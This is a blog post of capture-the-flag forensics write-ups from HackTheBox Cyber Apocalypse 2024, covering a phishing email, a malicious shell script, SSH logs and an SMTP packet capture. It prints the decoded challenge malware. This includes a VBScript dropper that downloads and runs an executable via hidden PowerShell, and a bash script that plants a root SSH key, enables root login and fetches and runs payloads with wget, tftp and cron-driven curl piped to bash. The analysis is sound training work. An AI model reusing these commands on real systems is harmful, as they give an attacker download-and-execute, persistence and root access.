---
layout: post
title: HackTheBox CyberApocalypse 2024 - Challenge Writeups
categories: [CTF Jeopardy]
tags: [ctf jeopardy,forens]
permalink: /posts/htbcyberapocalypsectf2024
img_path: /images/ctfs/htbcyberapocalypse2024
image:
  path: icon.jpg
---

This is a writeup for some forensics challenges from HackTheBox's Cyber Apocalypse 2024, I played this CTF with [thehackerscrew](http://www.thehackerscrew.team/) and we placed 8th!

## forens/Urgent (? solves)
> In the midst of Cybercity's "Fray," a phishing attack targets its factions, sparking chaos. As they decode the email, cyber sleuths race to trace its source, under a tight deadline. Their mission: unmask the attacker and restore order to the city. In the neon-lit streets, the battle for cyber justice unfolds, determining the factions' destiny.

We start with an EML file, inside a base64 encoded file  `onlineform.html`.

```
-----------------------2de0b0287d83378ead36e06aee64e4e5
Content-Type: text/html; filename="onlineform.html"; name="onlineform.html"
Content-Transfer-Encoding: base64
Content-Disposition: attachment; filename="onlineform.html"; name="onlineform.html"

PGh0bWw+DQo8aGVhZD4NCjx0aXRsZT48L3RpdGxlPg0KPGJvZHk+DQo8c2NyaXB0IGxhbmd1YWdl
PSJKYXZhU2NyaXB0IiB0eXBlPSJ0ZXh0L2phdmFzY3JpcHQiPg0KZG9jdW1lbnQud3JpdGUodW5l
c2NhcGUoJyUzYyU2OCU3NCU2ZCU2YyUzZSUwZCUwYSUzYyU2OCU2NSU2MSU2NCUzZSUwZCUwYSUz
YyU3NCU2OSU3NCU2YyU2NSUzZSUyMCUzZSU1ZiUyMCUzYyUyZiU3NCU2OSU3NCU2YyU2NSUzZSUw
ZCUwYSUzYyU2MyU2NSU2ZSU3NCU2NSU3MiUzZSUzYyU2OCUzMSUzZSUzNCUzMCUzNCUyMCU0ZSU2
ZiU3NCUyMCU0NiU2ZiU3NSU2ZSU2NCUzYyUyZiU2OCUzMSUzZSUzYyUyZiU2MyU2NSU2ZSU3NCU2
NSU3MiUzZSUwZCUwYSUzYyU3MyU2MyU3MiU2OSU3MCU3NCUyMCU2YyU2MSU2ZSU2NyU3NSU2MSU2
NyU2NSUzZCUyMiU1NiU0MiU1MyU2MyU3MiU2OSU3MCU3NCUyMiUzZSUwZCUwYSU1MyU3NSU2MiUy
...
```

If we base64 decode the attachment, we get a HTML file containing this:

```html
<html>
<head>
<title></title>
<body>
<script language="JavaScript" type="text/javascript">
document.write(unescape('%3c%68%74%6d%6c%3e%0d%0a%3c%68%65%61%64%3e%0d%0a%3c%74%69%74%6c%65%3e%20%3e%5f%20%3c%2f%74%69%74%6c%65%3e%0d%0a%3c%63%65%6e%74%65%72%3e%3c%68%31%3e%34%30%34%20%4e%6f%74%20%46%6f%75%6e%64%3c%2f%68%31%3e%3c%2f%63%65%6e%74%65%72%3e%0d%0a%3c%73%63%72%69%70%74%20%6c%61%6e%67%75%61%67%65%3d%22%56%42%53%63%72%69%70%74%22%3e%0d%0a%53%75%62%20%77%69%6e%64%6f%77%5f%6f%6e%6c%6f%61%64%0d%0a%09%63%6f%6e%73%74%20%69%6d%70%65%72%73%6f%6e%61%74%69%6f%6e%20%3d%20%33%0d%0a%09%43%6f%6e%73%74%20%48%49%44%44%45%4e%5f%57%49%4e%44%4f%57%20%3d%20%31%32%0d%0a%09%53%65%74%20%4c%6f%63%61%74%6f%72%20%3d%20%43%72%65%61%74%65%4f%62%6a%65%63%74%28%22%57%62%65%6d%53%63%72%69%70%74%69%6e%67%2e%53%57%62%65%6d%4c%6f%63%61%74%6f%72%22%29%0d%0a%09%53%65%74%20%53%65%72%76%69%63%65%20%3d%20%4c%6f%63%61%74%6f%72%2e%43%6f%6e%6e%65%63%74%53%65%72%76%65%72%28%29%0d%0a%09%53%65%72%76%69%63%65%2e%53%65%63%75%72%69%74%79%5f%2e%49%6d%70%65%72%73%6f%6e%61%74%69%6f%6e%4c%65%76%65%6c%3d%69%6d%70%65%72%73%6f%6e%61%74%69%6f%6e%0d%0a%09%53%65%74%20%6f%62%6a%53%74%61%72%74%75%70%20%3d%20%53%65%72%76%69%63%65%2e%47%65%74%28%22%57%69%6e%33%32%5f%50%72%6f%63%65%73%73%53%74%61%72%74%75%70%22%29%0d%0a%09%53%65%74%20%6f%62%6a%43%6f%6e%66%69%67%20%3d%20%6f%62%6a%53%74%61%72%74%75%70%2e%53%70%61%77%6e%49%6e%73%74%61%6e%63%65%5f%0d%0a%09%53%65%74%20%50%72%6f%63%65%73%73%20%3d%20%53%65%72%76%69%63%65%2e%47%65%74%28%22%57%69%6e%33%32%5f%50%72%6f%63%65%73%73%22%29%0d%0a%09%45%72%72%6f%72%20%3d%20%50%72%6f%63%65%73%73%2e%43%72%65%61%74%65%28%22%63%6d%64%2e%65%78%65%20%2f%63%20%70%6f%77%65%72%73%68%65%6c%6c%2e%65%78%65%20%2d%77%69%6e%64%6f%77%73%74%79%6c%65%20%68%69%64%64%65%6e%20%28%4e%65%77%2d%4f%62%6a%65%63%74%20%53%79%73%74%65%6d%2e%4e%65%74%2e%57%65%62%43%6c%69%65%6e%74%29%2e%44%6f%77%6e%6c%6f%61%64%46%69%6c%65%28%27%68%74%74%70%73%3a%2f%2f%73%74%61%6e%64%75%6e%69%74%65%64%2e%68%74%62%2f%6f%6e%6c%69%6e%65%2f%66%6f%72%6d%73%2f%66%6f%72%6d%31%2e%65%78%65%27%2c%27%25%61%70%70%64%61%74%61%25%5c%66%6f%72%6d%31%2e%65%78%65%27%29%3b%53%74%61%72%74%2d%50%72%6f%63%65%73%73%20%27%25%61%70%70%64%61%74%61%25%5c%66%6f%72%6d%31%2e%65%78%65%27%3b%24%66%6c%61%67%3d%27%48%54%42%7b%34%6e%30%74%68%33%72%5f%64%34%79%5f%34%6e%30%74%68%33%72%5f%70%68%31%73%68%69%31%6e%67%5f%34%74%74%33%6d%70%54%7d%22%2c%20%6e%75%6c%6c%2c%20%6f%62%6a%43%6f%6e%66%69%67%2c%20%69%6e%74%50%72%6f%63%65%73%73%49%44%29%0d%0a%09%77%69%6e%64%6f%77%2e%63%6c%6f%73%65%28%29%0d%0a%65%6e%64%20%73%75%62%0d%0a%3c%2f%73%63%72%69%70%74%3e%0d%0a%3c%2f%68%65%61%64%3e%0d%0a%3c%2f%68%74%6d%6c%3e%0d%0a'));
</script>
</body>
</html>
```

That's a suspicious script tag... Decoding the URL encoding there is some more HTML, containing the flag:

```html
<html>
<head>
<title> >_ </title>
<center><h1>404 Not Found</h1></center>
<script language="VBScript">
Sub window_onload
	const impersonation = 3
	Const HIDDEN_WINDOW = 12
	Set Locator = CreateObject("WbemScripting.SWbemLocator")
	Set Service = Locator.ConnectServer()
	Service.Security_.ImpersonationLevel=impersonation
	Set objStartup = Service.Get("Win32_ProcessStartup")
	Set objConfig = objStartup.SpawnInstance_
	Set Process = Service.Get("Win32_Process")
	Error = Process.Create("cmd.exe /c powershell.exe -windowstyle hidden (New-Object System.Net.WebClient).DownloadFile('https://standunited.htb/online/forms/form1.exe','%appdata%\form1.exe');Start-Process '%appdata%\form1.exe';$flag='HTB{4n0th3r_d4y_4n0th3r_ph1shi1ng_4tt3mpT}", null, objConfig, intProcessID)
	window.close()
end sub
</script>
</head>
</html>

```

Flag: <mark>HTB{4n0th3r_d4y_4n0th3r_ph1shi1ng_4tt3mpT}</mark>

## forens/It Has Begun (? solves)
> The Fray is upon us, and the very first challenge has been released! Are you ready factions!? Considering this is just the beginning, if you cannot musted the teamwork needed this early, then your doom is likely inevitable.

We start with a `script.sh` containing some bash commands.

```bash
#!/bin/sh

if [ "$HOSTNAME" != "KORP-STATION-013" ]; then
    exit
fi

if [ "$EUID" -ne 0 ]; then
    exit
fi

docker kill $(docker ps -q)
docker rm $(docker ps -a -q)

echo "ssh-rsa AAAAB4NzaC1yc2EAAAADAQABAAABAQCl0kIN33IJISIufmqpqg54D7s4J0L7XV2kep0rNzgY1S1IdE8HDAf7z1ipBVuGTygGsq+x4yVnxveGshVP48YmicQHJMCIljmn6Po0RMC48qihm/9ytoEYtkKkeiTR02c6DyIcDnX3QdlSmEqPqSNRQ/XDgM7qIB/VpYtAhK/7DoE8pqdoFNBU5+JlqeWYpsMO+qkHugKA5U22wEGs8xG2XyyDtrBcw10xz+M7U8Vpt0tEadeV973tXNNNpUgYGIFEsrDEAjbMkEsUw+iQmXg37EusEFjCVjBySGH3F+EQtwin3YmxbB9HRMzOIzNnXwCFaYU5JjTNnzylUBp/XB6B user@tS_u0y_ll1w{BTH" >> /root/.ssh/authorized_keys
echo "nameserver 8.8.8.8" >> /etc/resolv.conf
echo "PermitRootLogin yes" >> /etc/ssh/sshd_config
echo "128.90.59.19 legions.korp.htb" >> /etc/hosts

for filename in /proc/*; do
    ex=$(ls -latrh $filename 2> /dev/null|grep exe)
    if echo $ex |grep -q "/var/lib/postgresql/data/postgres\|atlas.x86\|dotsh\|/tmp/systemd-private-\|bin/sysinit\|.bin/xorg\|nine.x86\|data/pg_mem\|/var/lib/postgresql/data/.*/memory\|/var/tmp/.bin/systemd\|balder\|sys/systemd\|rtw88_pcied\|.bin/x\|httpd_watchdog\|/var/Sofia\|3caec218-ce42-42da-8f58-970b22d131e9\|/tmp/watchdog\|cpu_hu\|/tmp/Manager\|/tmp/manh\|/tmp/agettyd\|/var/tmp/java\|/var/lib/postgresql/data/pоstmaster\|/memfd\|/var/lib/postgresql/data/pgdata/pоstmaster\|/tmp/.metabase/metabasew"; then
        result=$(echo "$filename" | sed "s/\/proc\///")
        kill -9 $result
        echo found $filename $result
    fi
done

ARCH=$(uname -m)
array=("x86" "x86_64" "mips" "aarch64" "arm")

if [[ $(echo ${array[@]} | grep -o "$ARCH" | wc -w) -eq 0 ]]; then
  exit
fi


cd /tmp || cd /var/ || cd /mnt || cd /root || cd etc/init.d  || cd /; wget http://legions.korp.htb/0xda4.0xda4.$ARCH; chmod 777 0xda4.0xda4.$ARCH; ./0xda4.0xda4.$ARCH; 
cd /tmp || cd /var/ || cd /mnt || cd /root || cd etc/init.d  || cd /; tftp legions.korp.htb -c get 0xda4.0xda4.$ARCH; cat 0xda4.0xda4.$ARCH > DVRHelper; chmod +x *; ./DVRHelper $ARCH; 
cd /tmp || cd /var/ || cd /mnt || cd /root || cd etc/init.d  || cd /; busybox wget http://legions.korp.htb/0xda4.0xda4.$ARCH; chmod 777;./0xda4.0xda4.$ARCH;
echo "*/5 * * * * root curl -s http://legions.korp.htb/0xda4.0xda4.$ARCH | bash -c 'NG5kX3kwdVJfR3IwdU5kISF9' " >> /etc/crontab
```

Immediately, the following line catches my eye, at the end is what looks like a flag all the way at the end:
```bash
echo "ssh-rsa AAAAB4NzaC1yc2EAAAADAQABAAABAQCl0kIN33IJISIufmqpqg54D7s4J0L7XV2kep0rNzgY1S1IdE8HDAf7z1ipBVuGTygGsq+x4yVnxveGshVP48YmicQHJMCIljmn6Po0RMC48qihm/9ytoEYtkKkeiTR02c6DyIcDnX3QdlSmEqPqSNRQ/XDgM7qIB/VpYtAhK/7DoE8pqdoFNBU5+JlqeWYpsMO+qkHugKA5U22wEGs8xG2XyyDtrBcw10xz+M7U8Vpt0tEadeV973tXNNNpUgYGIFEsrDEAjbMkEsUw+iQmXg37EusEFjCVjBySGH3F+EQtwin3YmxbB9HRMzOIzNnXwCFaYU5JjTNnzylUBp/XB6B user@tS_u0y_ll1w{BTH" >> /root/.ssh/authorized_keys
```

Reversing the string at the end (`tS_u0y_ll1w{BTH`) we get `HTB{w1ll_y0u_St`, now wheres the rest?

At the end of the script we can see they execute a base64 string:

```
echo "*/5 * * * * root curl -s http://legions.korp.htb/0xda4.0xda4.$ARCH | bash -c 'NG5kX3kwdVJfR3IwdU5kISF9' " >> /etc/crontab
```

, decoding that we get `4nd_y0uR_Gr0uNd!!}`

Combining the two, we get the flag.

Flag: <mark>HTB{w1ll_y0u_St4nd_y0uR_Gr0uNd!!}</mark>

## forens/An unusual sighting (? solves)
> As the preparations come to an end, and The Fray draws near each day, our newly established team has started work on refactoring the new CMS application for the competition. However, after some time we noticed that a lot of our work mysteriously has been disappearing! We managed to extract the SSH Logs and the Bash History from our dev server in question. The faction that manages to uncover the perpetrator will have a massive bonus come competition!

We start this challenge with two files: `bash_history.txt` and `sshd.log`.

### Question 1
> What is the IP Address and Port of the SSH Server (IP:PORT)

Looking inside the `sshd.log`, line 3 says the following:
```
[2024-01-28 15:24:23] Connection from 100.72.1.95 port 47721 on 100.107.36.130 port 2221 rdomain ""
```

The `on` section is the server.

Answer: <marK>100.107.36.130:2221</mark>

### Question 2
> What time is the first successful Login

Reading the `sshd.log`, the lines containing `Accepted` are the successful logins, so whats the earliest instance?

```
[2024-02-13 11:29:50] Accepted password for root from 100.81.51.199 port 63172 ssh2
```

Answer: <mark>2024-02-13 11:29:50</mark>

### Question 3
> What is the time of the unusual Login

Reading the `sshd.log`, there is a weird login time at 4am onto the root account:
```
[2024-02-19 04:00:14] Connection from 2.67.182.119 port 60071 on 100.107.36.130 port 2221 rdomain ""
[2024-02-19 04:00:14] Failed publickey for root from 2.67.182.119 port 60071 ssh2: ECDSA SHA256:OPkBSs6okUKraq8pYo4XwwBg55QSo210F09FCe1-yj4
[2024-02-19 04:00:14] Accepted password for root from 2.67.182.119 port 60071 ssh2
[2024-02-19 04:00:14] Starting session: shell on pts/2 for root from 2.67.182.119 port 60071 id 0
[2024-02-19 04:38:17] syslogin_perform_logout: logout() returned an error
[2024-02-19 04:38:17] Received disconnect from 2.67.182.119 port 60071:11: disconnected by user
[2024-02-19 04:38:17] Disconnected from user root 2.67.182.119 port 60071
```

The rest of the logins being from ~0900-1900, this is highly suspicious.

Answer: <mark>2024-02-19 04:00:14</mark>

### Question 4
> What is the Fingerprint of the attacker's public key

Reading those suspicious logs from question 3, we can see the public key fails on the second line.

Answer: <mark>OPkBSs6okUKraq8pYo4XwwBg55QSo210F09FCe1-yj4</mark>

### Question 5
> What is the first command the attacker executed after logging in

This time reading `bash_history.txt` and going to the suspicious time (4am), we can see the first command executed is `whoami`.

```
[2024-02-16 12:38:11] python ./server.py --tests
[2024-02-16 14:40:47] python ./server.py --tests
[2024-02-19 04:00:18] whoami
[2024-02-19 04:00:20] uname -a
```

Answer: <mark>whoami</mark>

### Question 6
> What is the final command the attacker executed before logging out

Reading the same logs segment, we get the final command:
```
[2024-02-19 04:12:02] shred -zu latest.tar.gz
[2024-02-19 04:14:02] ./setup
[2024-02-20 11:11:14] nvim server.py
```

Answer: <mark>./setup</mark>

And in return, we are given our flag: <mark>HTB{B3sT_0f_luck_1n_th3_Fr4y!!}</mark>

## forens/Phreaky (? solves)
> In the shadowed realm where the Phreaks hold sway, A mole lurks within, leading them astray. Sending keys to the Talents, so sly and so slick, A network packet capture must reveal the trick. Through data and bytes, the sleuth seeks the sign, Decrypting messages, crossing the line. The traitor unveiled, with nowhere to hide, Betrayal confirmed, they'd no longer abide.

We start this challenge with `phreaky.pcap`, and I open it with Wireshark.

Skimming the traffic, there is some HTTP traffic, and some SMTP traffic.

Reading the HTTP traffic, it seems to only be typical requests for ubuntu packages and updates.

The SMTP traffic on the other hand, there are some emails which we can see viewing the reassembled SMTP packets containing attachments

```
...
--=-=DBZhoU35m_YtHyGmIsZszrXoWQVlI-1y1rd3=-=
Content-Type: text/plain; charset=us-ascii
Content-Disposition: inline
Content-ID: <20240306145912.g2I1r%caleb@thephreaks.com>

Attached is a part of the file. Password: S3W8yzixNoL8

--=-=DBZhoU35m_YtHyGmIsZszrXoWQVlI-1y1rd3=-=
Content-Type: application/zip
Content-Transfer-Encoding: base64
Content-Disposition: attachment; 
 filename*0="caf33472c6e0b2de339c1de893f78e67088cd6b1586a581c6f8e87b5596";
 filename*1="efcfd.zip"
Content-ID: <20240306145912.Emuab%caleb@thephreaks.com>

UEsDBBQACQAIAGZ3ZlhwRyBT2gAAAN0AAAAWABwAcGhyZWFrc19wbGFuLnBkZi5wYXJ0MVVUCQAD
wIToZcCE6GV1eAsAAQToAwAABOgDAAA9mPwEVmy1t/sLJ62NzXeCBFSSSZppyIzvPXL++cJbuCeL
nP4XXiAK9/HZL9xRw4LjlDf5eDd6BgBOKZqSn6qpM6g1WKXriS7k3lx5VkNnqlqQIfYnUdOCnkD/
1vzCyhuGdHPia5lmy0HoG+qdXABlLyNDgxvB9FTOcXK7oDHBOf3kmLSQFdxXsjfooLtBtC+y4gdB
xB4V3bImQ8TB5sPY55dvEKWCJ34CzRJbgIIirkD2GDIoQEHznvJA7zNnOvce1hXGA2+P/XmHe+4K
tL/fmrWMVpQEd+/GQlBLBwhwRyBT2gAAAN0AAABQSwECHgMUAAkACABmd2ZYcEcgU9oAAADdAAAA
FgAYAAAAAAAAAAAAtIEAAAAAcGhyZWFrc19wbGFuLnBkZi5wYXJ0MVVUBQADwIToZXV4CwABBOgD
AAAE6AMAAFBLBQYAAAAAAQABAFwAAAA6AQAAAAA=

--=-=DBZhoU35m_YtHyGmIsZszrXoWQVlI-1y1rd3=-=--
```

Looking at the contents of the first zip, we can see the following file: `phreaks_plan.pdf.part1`.

Looking through the remaining SMTP packets, we can see multiple files following the same names: `phreaks_plan.pdf.part2`, `phreaks_plan.pdf.part3`, etc...

After getting all of the file parts, we can use a hex editor to string all of the bytes todather and make a working PDF.

Inside the PDF, is the flag.

![pdf.png](pdf.png)

Flag: <mark>HTB{Th3Phr3aksReadyT0Att4ck}</mark>

## Thanks for reading!

![cert.png](cert.png)

Feel free to give me feedback or follow me on [Twitter](https://twitter.com/sealldev) and [LinkedIn](https://www.linkedin.com/in/noah-cooper-5442ab309/).

You can also find my other contacts on the [whoami](../about) page.
